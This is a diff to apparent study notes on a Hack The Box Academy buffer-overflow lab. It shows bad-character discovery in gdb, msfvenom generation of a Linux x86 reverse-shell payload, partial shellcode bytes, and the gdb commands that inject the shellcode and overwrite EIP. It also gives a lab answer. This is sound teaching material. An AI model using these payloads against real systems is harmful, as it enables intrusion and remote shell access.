@@ -511,8 +511,6 @@ How the buffer will look:
 
 ![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_8.png)
 
-
-
 ### Use in practice
 
 Command:
@@ -520,8 +518,6 @@ Command:
 ```
 run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')` 
 ```
-
-
 
 In gdb:
 
@@ -534,11 +530,7 @@ Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 10
 Program received signal SIGSEGV, Segmentation fault.0x66666666 in ?? ()
 ```
 
-
-
 ## Identification of Bad Characters
-
-
 
 Bad characters:
 
@@ -547,11 +539,7 @@ Bad characters:
 - `\x0D` - Carriage Return
 - `\xFF` - Form Feed
 
-
-
 To find it we can use this character list: `CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"` 
-
-
 
 And with using this we can try and find bad characters with running the previous command, just with the wordlist as our payload.
 
@@ -579,70 +567,137 @@ To look at the stack:
 ```shell
 (gdb) x/2000xb $esp+500
 
-0xffffd28a:	0xbb	0x69	0x36	0x38	0x36	0x00	0x00	0x00
-0xffffd292:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
-0xffffd29a:	0x00	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x73
-0xffffd2a2:	0x74	0x75	0x64	0x65	0x6e	0x74	0x2f	0x62
-0xffffd2aa:	0x6f	0x77	0x2f	0x62	0x6f	0x77	0x33	0x32
-0xffffd2b2:	0x00    0x55	0x55	0x55	0x55	0x55	0x55	0x55
-				 # |---> "\x55"s begin
+0xffffd28a:    0xbb    0x69    0x36    0x38    0x36    0x00    0x00    0x00
+0xffffd292:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0xffffd29a:    0x00    0x2f    0x68    0x6f    0x6d    0x65    0x2f    0x73
+0xffffd2a2:    0x74    0x75    0x64    0x65    0x6e    0x74    0x2f    0x62
+0xffffd2aa:    0x6f    0x77    0x2f    0x62    0x6f    0x77    0x33    0x32
+0xffffd2b2:    0x00    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+                 # |---> "\x55"s begin
 
-0xffffd2ba: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
-0xffffd2c2: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
+0xffffd2ba: 0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd2c2: 0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
 <SNIP>
 ```
 
 We will look where the 0x55 ends. 
 
 ```shell
-0xffffd5aa:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
-0xffffd5b2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
-0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
-												 # |---> CHARS begin
+0xffffd5aa:    0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5b2:    0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5ba:    0x55    0x55    0x55    0x55    0x55    0x01    0x02    0x03
+                                                 # |---> CHARS begin
 
-0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
-0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
-0xffffd5d2:	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b	0x1c
+0xffffd5c2:    0x04    0x05    0x06    0x07    0x08    0x00    0x0b    0x0c
+0xffffd5ca:    0x0d    0x0e    0x0f    0x10    0x11    0x12    0x13    0x14
+0xffffd5d2:    0x15    0x16    0x17    0x18    0x19    0x1a    0x1b    0x1c
 ```
 
 Every `null byte (\x00)` shows us that this character is a bad character.
 
-
-
 ### Q: Find all bad characters that change or interrupt our sent bytes' order and submit them as the answer (e.g., format: \x00\x11).
-
-
 
 `\x00\x09\x0A\x20`
 
- 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ## Generating Shellcode
 
+When generating shell code, pay attention to these ares
+
+- `Architecture`
+- `Platform`
+- `Bad Characters`
+
+### MSFvenom Syntax
+
+```shell
+DanielBoye@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
+```
+
+### MSFvenom - Generate Shellcode
+
+```shell
+DanielBoye@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
+
+Found 11 compatible encodersAttempting to encode payload with 1 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 95 (iteration=0)x86/shikata_ga_nai chosen with final size 95Payload size: 95 bytesFinal size of c file: 425 bytesSaved as: shellcode
+```
+
+### Shellcode
+
+```shell
+DanielBoye@htb[/htb]$ cat shellcode
+
+unsigned char buf[] = "\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1""\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41""\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"<SNIP>
+```
+
+### Exploit with Shellcode
+
+```shell
+(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
+
+The program being debugged has been started already.Start it from the beginning? (y or n) y
+
+Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
+
+Breakpoint 1, 0x56555551 in bowfunc ()
+```
+
+### The Stack
+
+```shell
+(gdb) x/2000xb $esp+550
+
+<SNIP>0xffffd64c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd654:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd65c:    0x90    0x90    0xda    0xca    0xba    0xe4    0x11    0xd4
+                         # |----> Shellcode begins
+<SNIP>
+```
+
 ## Identification of the Return Address
+
+### GDB NOPS
+
+```shell
+(gdb) x/2000xb $esp+1400
+
+<SNIP>0xffffd5ec:    0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x550xffffd5f4:    0x55    0x55    0x55    0x55    0x55    0x55    0x90    0x90
+                                # End of "\x55"s   ---->|  |---> NOPS
+0xffffd5fc:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd604:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd60c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd614:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd61c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd624:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd62c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd634:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd63c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd644:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd64c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd654:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd65c:    0x90    0x90    0xda    0xca    0xba    0xe4    0x11    0xd4
+                         # |---> Shellcode
+<SNIP>
+```
+
+This picture illustrates where the adress `0xffffd64c` is. 
+
+![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_9.png)
+
+After selecting a memory address, we replace our "`\x66`" which overwrites the EIP to tell it to jump to the `0xffffd64c` address. Note that the input of the address is entered backward.
+
+### Exploitation
+
+```shell
+(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
+```
 
 # Proof-Of-Concept
 
 ## Public Exploit Modification
 
+When working with exploits, public ones might not work in your case. That is why we should learn how to edit and write exploits so we can fine tune them to our own usecase. 
+
 ## Prevention Techniques and Mechanisms
+
+Security mechanism preventing this
+
+- `Canaries`
+  - Known values written to the stack between **buffer and control data**, to **detect buffer overflows**
+- `Address Space Layout Randomization` (`ASLR`)
+  - Difficult to find target adresses in memory
+- `Data Execution Prevention` (`DEP`)
+  - Monitors that the program access memory areas cleanly
 
 # Skills Assessment
 
 ## Skills Assessment - Buffer Overflow
+
+### Q: Determine the file type of "leave_msg" binary and submit it as the answer.
+
+
